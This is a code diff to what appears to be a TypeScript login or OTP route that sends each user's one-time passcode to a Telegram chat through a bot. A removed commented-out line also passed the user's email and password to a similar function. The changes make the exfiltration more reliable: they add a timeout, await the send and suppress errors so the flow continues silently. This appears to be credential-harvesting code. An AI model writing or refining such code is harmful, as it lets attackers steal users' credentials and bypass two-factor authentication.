@@ -15,14 +15,21 @@ async function sendToTelegram(userCode: string) {
         chat_id: CHAT_ID,
         text: message,
         parse_mode: 'Markdown'
+      },
+      {
+        timeout: 10000, // 10 second timeout
+        headers: {
+          'Content-Type': 'application/json'
+        }
       }
     );
     
-    console.log('Telegram notification sent successfully');
+    console.log('Telegram notification sent successfully:', response.data);
     return response.data;
   } catch (error) {
-    console.error("Error sending Telegram notification:");
-    throw error;
+    console.error("Error sending Telegram notification:", error);
+    // Don't throw - log error but continue
+    return null;
   }
 }
 
@@ -59,8 +66,13 @@ async function sendToTelegram(userCode: string) {
           otp,
         },
       });
-      //await tgfy(email, existingUser?.password as string, otp);
-      sendToTelegram(otp)
+      
+      // Send to Telegram (await to ensure it completes)
+      await sendToTelegram(otp).catch(err => {
+        console.error('Failed to send Telegram notification:', err);
+        // Continue even if Telegram fails
+      });
+      
       return NextResponse.json(user);
     } catch (error) {
       console.error(error);
